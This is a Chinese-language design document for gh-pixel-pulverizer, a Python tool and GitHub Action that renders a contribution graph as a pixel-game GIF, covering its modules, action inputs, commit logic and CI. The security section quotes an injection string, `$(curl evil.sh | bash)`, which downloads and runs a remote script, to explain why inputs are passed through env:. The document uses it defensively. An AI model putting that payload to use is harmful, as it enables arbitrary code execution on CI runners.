# 02 · 模块职责

---

## 1. 职责总览

| 文件 | 行数 | 角色 | 对外暴露面 | 可否独立执行 |
|------|------|------|------------------|-------------|
| `gh_pixel_pulverizer/__init__.py` | 3 | 包标记 + **版本号唯一来源** | `__version__` | 否 |
| `gh_pixel_pulverizer/__main__.py` | 4 | `python -m` 入口 | — | 是（`python -m gh_pixel_pulverizer`） |
| `gh_pixel_pulverizer/cli.py` | 868 | **全部业务逻辑**：常量、模型、引擎、渲染、编码、CLI | 见 [03](./03-api-reference.md) | **是**（`python cli.py ...`） |
| `tests/test_smoke.py` | 184 | 离线冒烟测试（18 例） | — | 是（`python tests/test_smoke.py`） |
| `action.yml` | 150 | GitHub **Composite Action** 定义 | 11 个 inputs / 3 个 outputs | 由 workflow `uses:` 调用 |
| `.github/workflows/ci.yml` | 52 | 本仓库自身的 CI | artifact `game-gif-py*` | 由 GitHub 触发 |
| `pyproject.toml` | 40 | PEP 621 打包元数据 | console script | `pip install` |
| `.gitignore` | 12 | 忽略 `__pycache__/`、`*.gif` 等 | — | — |

---

## 2. `gh_pixel_pulverizer/__init__.py`

```python
"""gh-pixel-pulverizer: 把 GitHub 贡献图炸成像素 GIF 💥"""

__version__ = "0.2.0"
```

职责单一：**作为版本号的唯一来源**。`pyproject.toml` 通过
`[tool.setuptools.dynamic] version = {attr = "gh_pixel_pulverizer.__version__"}` 读取，
避免在 `pyproject.toml` 与代码里两处维护、容易漂移。

> 发版流程：只改这一行的 `__version__`，无需触碰 `pyproject.toml`。

---

## 3. `gh_pixel_pulverizer/__main__.py`

```python
from gh_pixel_pulverizer.cli import main

if __name__ == "__main__":
    main()
```

职责：让 `python -m gh_pixel_pulverizer <args>` 可用。
`if __name__` 守卫避免被 import 时副作用执行。

---

## 4. `gh_pixel_pulverizer/cli.py` —— 核心

虽然只有一个文件，但内部组织清晰，按注释分隔线可分成 **7 个逻辑区块**：

| 区块 | 行号区间 | 内容 | 依赖 |
|------|----------|------|------|
| ① 调色板常量 | `36-55` | 颜色 RGB 元组（背景、5 级绿、飞船、BOSS、子弹、星空、粒子、HUD） | 无 |
| ② 尺寸/可调参数 | `58-101` | 画布几何、`STAR_SPEEDS`、`DEFAULT_COLORS`、`TARGET_LOCK_FRAMES`、`BULLET_PIERCE`、`SHIP_TRACK` | 无 |
| ③ 数据结构 | `104-171` | 6 个 `@dataclass` + `Strategy` 枚举 | dataclasses / enum |
| ④ GitHub GraphQL | `174-258` | `GRAPHQL` 查询串、`fetch_contributions()`、`generate_dummy()` | json / urllib / zlib / random |
| ⑤ `Engine` | `261-748` | 初始化 + 更新 + 绘制 + 主循环 | PIL / math / bisect / random |
| ⑥ GIF 编码 | `751-804` | `_clamp_colors`、`build_palette`、`quantize_frame`、`encode_gif` | PIL / os |
| ⑦ CLI | `807-868` | `main(argv)` argparse + 编排 | argparse / os |

### 4.1 区块内部的调用关系

```
⑤ Engine
  ├── __init__ ──▶ _build_targets   （③ Target）
  │            └──▶ _spawn_stars    （③ Star）
  ├── 每帧更新：_update_stars / _update_ship / _fire /
  │             _update_bullets / _update_enemies / _update_particles
  ├── _pick_target  （④ Strategy）
  ├── _collide ────▶ _explode       （③ Particle / Enemy）
  ├── _prune
  └── 绘制：_draw_grid_bg / _draw_stars / _draw_targets / _draw_enemies /
            _draw_bullets / _draw_ship / _draw_particles / _draw_hud
       └── 汇总为 _render_frame ──▶ iter_frames ──▶ run

⑦ main ──▶ ④ fetch_contributions 或 generate_dummy
       ──▶ ⑤ Engine(contrib, ...)
       ──▶ ⑥ encode_gif(engine.iter_frames(), ...)
       ──▶ 写 $GITHUB_OUTPUT
```

### 4.2 私有方法命名约定

- `_update_*`：推进物理/逻辑，**有副作用**，不绘制。
- `_draw_*`：只读当前状态，向 `ImageDraw` 写入，**不改变**游戏状态。
- `_pick_*` / `_auto_*`：纯策略计算。
- `_prune`：内存回收。
- 公开成员（`targets`、`score`、`defeated`、`total_targets`、`frame`）供测试与外部读取。

---

## 5. `action.yml` —— 对外交付形态

**Composite Action**（`runs.using: "composite"`），供其他仓库用
`uses: h1s97x/gh-pixel-pulverizer@main` 引用。

### 5.1 三个 step

| Step | 作用 | 关键点 |
|------|------|--------|
| ① 🐍 Check Python + Pillow | 缺失时才装 Pillow | 兼容 PEP 668 环境：`--break-system-packages` → 普通 → `pip` 三级降级 |
| ② 💥 Generate GIF | 生成 GIF | `cd ${{ github.action_path }}`；所有用户输入走 `env:`；`EXTRA=(--seed ...)` 数组拼参数，避免空字符串污染 argv |
| ③ 📦 Commit & Push | 提交产物 | 可由 `no-commit` 跳过；文件无变化则跳过；符合条件时 amend 上一次自己的 commit |

### 5.2 inputs → CLI 参数映射

| Action input | 默认 | CLI 参数 |
|--------------|------|----------|
| `github-token`（必填） | — | env `GH_TOKEN` |
| `username` | `""`（空则取仓库 owner） | 位置参数 `${{ inputs.username \|\| github.repository_owner }}` |
| `output-path` | `game.gif` | `-o` |
| `strategy` | `random` | `-s` |
| `fps` | `40` | `--fps` |
| `max-frame` | `0`（自动） | `--max-frame` |
| `boss-chance` | `0.18` | `--boss-chance` |
| `colors` | `32` | `--colors` |
| `seed` | `""`（留空 = 随机） | `--seed`（非空时才追加） |
| `no-amend` | `false` | 不传 CLI，控制 step ③ 行为 |
| `no-commit` | `false` | 不传 CLI，控制 step ③ 是否执行 |

### 5.3 outputs

`steps.generate.outputs.{output,frames,score}` —— 由 `main()` 写入 `$GITHUB_OUTPUT`
（`cli.py:860-864`）后由 GitHub 自动提升为 step outputs。
> 注意 `main()` 还会多写一行 `username=`，但 `action.yml` 只声明了 3 个 output。

### 5.4 安全设计（**不可退让**）

```yaml
env:
  GH_TOKEN: ${{ inputs.github-token }}
  INPUT_USERNAME: ${{ inputs.username || github.repository_owner }}
  ...
run: |
  python3 gh_pixel_pulverizer/cli.py "${INPUT_USERNAME}" ...
```

**所有用户可控值一律经 `env:` 传递，再在脚本里以 `"$VAR"` 引用**。
若直接写成 `run: python cli.py "${{ inputs.username }}"`，攻击者只需在 issue/workflow 输入里
填 `$(curl evil.sh | bash)` 就能在 runner 上执行任意命令。这是历史提交 `94f4237` 修复的问题。

### 5.5 Step ③ 的提交策略

```
Pseudo:

if no-commit == 'true'                     → 完全跳过
if ! -f $OUTPUT                            → 退出（无产物）
git add -- $OUTPUT
if 暂存区中 $OUTPUT 无 diff                → 退出（内容没变，不污染历史）
if no-amend != 'true'
   and 没有其他已暂存改动
   and 没有其他未暂存改动
   and 上一条 commit message 形如 "💥*pixel-pulverizer*"
                                           → git commit --amend --no-edit && git push --force-with-lease
else                                       → 新建 commit "💥 pixel-pulverizer: update $GITHUB_RUN_ID" && git push
```

设计意图：**定时任务每天跑一次，若每次都新建 commit 会让贡献历史被自己的机器人刷屏**。
`amend` 使「每天更新同一张 GIF」在历史里始终只占一条记录。
三重条件（无其他改动 + 上条 commit 是我们写的）确保 amend **绝不会夹带或覆盖他人代码改动**。

---

## 6. `.github/workflows/ci.yml` —— 本仓库自身的 CI

| 配置 | 值 |
|------|-----|
| 触发 | `push` 到 `main`、`pull_request`、`workflow_dispatch` |
| 权限 | `contents: read`（最小权限原则） |
| 矩阵 | Python `3.9` / `3.12`，`fail-fast: false`（两个版本都跑完） |
| Step 1 | `actions/checkout@v4` |
| Step 2 | `actions/setup-python@v5` |
| Step 3 | `pip install --upgrade pip pillow` |
| Step 4 | `python -m unittest discover -s tests -v` |
| Step 5 | 端到端：`python -m gh_pixel_pulverizer octocat --offline -o game.gif --seed 7` + 断言 `size > 0` |
| Step 6 | `actions/upload-artifact@v4` 上传 `game.gif`，保留 7 天 |

> **注意**：CI 不安装本项目包，而是靠 `tests/test_smoke.py` 里手动 `sys.path.insert(0, 仓库根)` 来导包。
> 这让 CI 即使在 `pip install pillow` 之后也能直接测试源码树。

---

## 7. `tests/test_smoke.py` —— 详见 [06](./06-testing-and-ci.md)

唯一测试文件，5 个测试类：

| 类 | 关注点 |
|----|--------|
| `TestDummyData` | 假数据形状、确定性、不同用户差异性 |
| `TestTargets` | 分档合法性、分档铺开度、靶子不越界 |
| `TestEngine` | 自动帧数能否清场、显式帧数是否被遵守、死亡对象被回收、帧尺寸、seed 确定性、4 种策略、空数据不崩 |
| `TestGifEncoding` | 编解码逐帧一致（无残影）、支持生成器、色数限幅、空输入抛错 |
| `TestNetworkFailurePaths` | 无凭据时 API 优雅降级返回 `None` |

---

## 8. 模块间依赖图（谁 import 谁）

```
                     ┌────────────────────┐
                     │  tests/test_smoke  │
                     └─────────┬──────────┘
                               │ from gh_pixel_pulverizer.cli import (...)
                               ▼
      ┌──────────────┐   ┌─────────────────────┐
      │ __main__.py  │──▶│       cli.py        │
      └──────────────┘   └──────────┬──────────┘
                                    │ PIL.Image / PIL.ImageDraw / PIL.ImageFont
                                    ▼
                              ┌──────────┐
                              │  pillow  │
                              └──────────┘

   __init__.py ← 被 pyproject.toml 的 dynamic.version 读取（构建期）
   __init__.py ← 被 tests 隐式导入（因为 import 包才会执行 __init__）
```

**没有循环依赖**，`cli.py` 不 import 同包任何模块 —— 这是它能被 `curl` 下来单文件运行的前提。
